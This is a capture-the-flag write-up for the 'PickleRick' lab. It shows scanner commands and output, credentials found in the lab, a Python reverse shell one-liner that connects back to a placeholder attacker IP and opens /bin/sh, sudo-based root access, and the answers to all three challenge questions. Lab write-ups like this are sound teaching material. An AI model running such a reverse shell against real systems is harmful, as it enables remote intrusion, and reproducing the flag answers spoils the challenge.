### PickleRick

```
export IP=10.10.151.51
```

## Nmap

```
nmap -sV -sC -oN nmap/inicial.out $IP -vv
```

### Nmap Results:

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c6:1a:fe:0d:4c:4f:c3:0f:a3:a2:f2:a3:ae:cc:d0:c0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+nKZ7PtOXxE8gbB4nMHrZfECt/mSCDhTto01xC1L0eQyntKWOhwYTsvKp6B1UDkFlFUrOZSKMtWqoEtD4+SbiYXGqns6ImwhKRtFE9KsneGo3BKqBYSammBs8I6lRfMm4EMeXVJ4M3t2VllrQl25nLTT0/fBMpWVj/i/oDvvirob5BPXiWi18bkSwvPUOvT1+X8Bmu6LnquQurW4cCMSM2KMYjahd9GgtqFTz6YezyY/KJeZNzbwS7LZs1ZFaUO/Fqos4guba+u2tuj0udysEbvvH8+gLst1vpsXC/sYvkme1SH/7DaEvOBnnL2d99+/Bokv8hft1jHEpiTV5Q9tx
|   256 20:f4:9a:3e:3c:ab:6e:2a:23:e8:33:c7:6a:4b:c0:07 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKgADA1rw+pp9DXx7JhyPIIoxrQZWPwzHszsAsCChaikNPjFHEtLyysnRPf72bqqU+8l1EV7lBM3gIAjCbBLGfo=
|   256 49:77:75:85:f5:5a:d1:31:58:4b:95:86:5a:e9:0d:39 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBs0TwkBcdVOEmtg9d+aCtcM3TLwzgHWJ557DuQI6k5q
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Gobuster

```
gobuster dir -u $IP -w wordlists/directory-list-2.3-medium.txt -x php,js,py,sh,txt,cgi,html,css -o ./gobuster/gbuster-firstpage.out
```

### Gobuster Results

```
/assets               (Status: 301) [Size: 313] [--> http://10.10.151.51/assets/]
/server-status        (Status: 403) [Size: 300]
```

## Nikto

```
nikto -h http://$IP | tee ./nikto/nikto.out 
```

### Nikto results

```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.151.51
+ Target Hostname:    10.10.151.51
+ Target Port:        80
+ Start Time:         2023-09-02 20:35:04 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /login.php: Admin login page/section found.
+ 8075 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-09-02 21:25:21 (GMT-3) (3017 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

## login page

User found in the first page source code: R1ckRul3s (login)

.txt found using gobuster: Wubbalubbadubdub (password)

## Base64

```
echo Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
```

result: rabbit hole 
(a waste of time heh)

## Python reversed shell

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MY_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Questions:

1. What is the first ingredient that Rick needs?

Sup3rS3cretPickl3Ingred.txt: mr. meeseek hair

2. What is the second ingredient in Rick’s potion?

if not sudo bash, then
```
sudo bash
```
then
```
cd /home
```
then find second ingredient in rick directory: 1 jerry tear

3. What is the last ingredient in Rick’s potion?

```
sudo bash
```
then
```
cd ~
``` 
then find 3rd.txt: fleeb juice
